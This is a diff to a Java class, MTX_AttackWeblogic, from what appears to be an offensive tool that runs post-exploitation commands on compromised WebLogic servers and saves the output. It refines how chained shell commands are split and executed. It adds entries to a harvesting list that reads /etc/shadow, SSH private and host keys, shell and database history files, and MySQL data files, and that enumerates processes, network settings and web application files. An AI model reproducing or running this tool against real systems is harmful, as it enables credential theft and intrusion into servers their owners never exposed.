@@ -57,9 +57,21 @@ public class MTX_AttackWeblogic extends DoNmapResult
 	private void getCmd(String szFile, String s)
 	{
 		String []a = s.split("\\s*[;；]\\s*");
-		for(String x:a)
+		for(int i = 0, j = a.length; i < j; i++)
 		{
+			String x = a[i];
 			x = x.trim();
+			// 没有命令就不处理
+			if(0 == x.length())continue;
+			// 处理\; 这种多方命令的特殊方式：find . -type f -size +100000k -exec ls -lh {} \; | awk  '{ print $9 ":" $5 }'
+			if(x.endsWith("\\"))
+			{
+				if(i <= j - 2)
+				{
+					x = x + ";" + a[i + 1];
+					a[i + 1] = "";
+				}
+			}
 			info(x);
 			writeFile(szFile, x  + "\n"+ App.runCmd(x) + "\n");
 		}
@@ -134,6 +146,8 @@ public class MTX_AttackWeblogic extends DoNmapResult
 					 "cat /etc/issue ; cat /etc/*-release ; cat /etc/lsb-release ; cat /etc/redhat-release",
 					 "是root吗？",
 					 "cat /etc/sudoers;cat /etc/passwd ;cat /etc/group ;cat /etc/shadow ;ls -alh /var/mail/;ls -ahlR /home/;ls -ahlR /root/",
+					 "查找mysql数据文件",
+					 "find /var/lib/mysql/ -regex \".*\\.frm\\|.*\\.idb\\|.*\\.MYI\\|.*\\.MYD\"",
 					 "历史操作信息",
 					 "cat ~/.bash_history ;cat ~/.nano_history ;cat ~/.atftp_history ;cat ~/.mysql_history ;cat ~/.php_history ;cat ~/.bashrc ;cat ~/.profile ;cat /var/mail/root ;cat /var/spool/mail/root ;cat ~/.ssh/authorized_keys ;cat ~/.ssh/identity.pub ;cat ~/.ssh/identity ;cat ~/.ssh/id_rsa.pub ;cat ~/.ssh/id_rsa ;cat ~/.ssh/id_dsa.pub ;cat ~/.ssh/id_dsa ;cat /etc/ssh/ssh_config ;cat /etc/ssh/sshd_config ;cat /etc/ssh/ssh_host_dsa_key.pub ;cat /etc/ssh/ssh_host_dsa_key ;cat /etc/ssh/ssh_host_rsa_key.pub ;cat /etc/ssh/ssh_host_rsa_key ;cat /etc/ssh/ssh_host_key.pub ;cat /etc/ssh/ssh_host_key ;ls -alh /var/log ;ls -alh /var/mail ;ls -alh /var/spool ;ls -alh /var/spool/lpd ;ls -alh /var/lib/pgsql ;ls -alh /var/lib/mysql ;cat /var/lib/dhcp3/dhclient.leases ;ls -alhR /var/www/ ;ls -alhR /srv/www/htdocs/ ;ls -alhR /usr/local/www/apache22/data/ ;ls -alhR /opt/lampp/htdocs/ ;ls -alhR /var/www/html/",
 					 "服务器时间，及当前目录",
@@ -153,9 +167,9 @@ public class MTX_AttackWeblogic extends DoNmapResult
 						"Linux块设备的信息.块设备是硬盘和闪驱等之类的存储设备"
 						,"lsblk -a"
 						,"文件系统信息"
-						,"df -a" 
+						,"df -h" 
 						,"进程、服务信息"
-						,"ps -ef ; ps aux ;cat /etc/service"
+						,"ps -aeo ruser,ppid,pid,lstart,%cpu,%mem,etime,tty,args --sort -%cpu,-%mem;cat /etc/service"
 						,"安装的应用信息"
 						,"ls -alh /usr/bin/;ls -alh /sbin/;ls -alh /var/cache/yum/;ls -alh /var/cache/apt/archivesO;rpm -qa;dpkg -l"
 						,"Service设置，有任何的错误配置吗？是否有任何（脆弱的）的插件？"
@@ -172,9 +186,10 @@ public class MTX_AttackWeblogic extends DoNmapResult
 						,"route;last;lsof -i;cat /etc/services;/sbin/ifconfig -a;cat /etc/network/interfaces;cat /etc/sysconfig/network;cat /etc/resolv.conf;cat /etc/sysconfig/network ;cat /etc/networks ;iptables -L ;hostname ;dnsdomainname"
 						," 端口和服务的查看"
 						,"netstat -a;chkconfig --list"
+						,"大于100M的文件"
+						,"find / -type f -size +100000k -exec ls -lh {} \\; | awk  '{ print $9 \":\" $5 }'"
 						,"当前目录jdbc"
 						,"find . -name jdbc.*",
-						
 						"所有jsp文件"
 						,"find . -name *.jsp",
 						"所有war"
